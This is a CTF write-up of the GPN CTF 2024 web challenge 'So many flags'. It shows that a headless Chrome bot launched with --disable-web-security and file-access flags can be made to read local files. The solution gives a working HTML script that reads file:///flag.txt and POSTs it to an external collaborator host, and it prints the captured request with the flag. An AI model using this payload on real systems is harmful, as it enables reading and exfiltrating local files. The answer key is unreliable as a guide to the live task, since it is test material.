---
ctf-event: GPN CTF 2024
date: 2024-06-01
ctf-team: luxeria
ctf-task: So many flags
ctf-category: web
ctf-difficulty: 
---
# So Many Flags

## Description

> I heard you like flags, so I launched Chrome with a lot of flags so you can get your flag!
> 
> The flag is in `/flag.txt`, and the bot will visit the HTML file you uploaded!

## Analysis

There is a file upload form:
![](_attachments/Pasted%20image%2020240601203901.png)

Google Chrome is started with numerous flags and the uploaded file:
```js
const command = `bash -c "google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run ${flags}     ${filePath}"`;
```

The following flags are included, which disable the same origin policy and allow local file access:
```text
--disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir
```

It's therefore possible to read files from other origins, including the `file://` URI scheme for local files.

## Solution

Upload a HTML file which reads the local file:
```html
<script>
  async function getFlag(){
    response = await fetch("file:///flag.txt");
    flag = await response.text();
    fetch("https://lk922ygynkim4zy48onzs2xaw12sqnec.oastify.com/", { method: "POST", body: flag})
  };
  getFlag();
</script>
```

The server will read the flag and send it to the external system:
```http
POST / HTTP/1.1
Host: lk922ygynkim4zy48onzs2xaw12sqnec.oastify.com
[...]

GPNCTF{CL1_FL4G5_4R3_FL4G5_T00}
```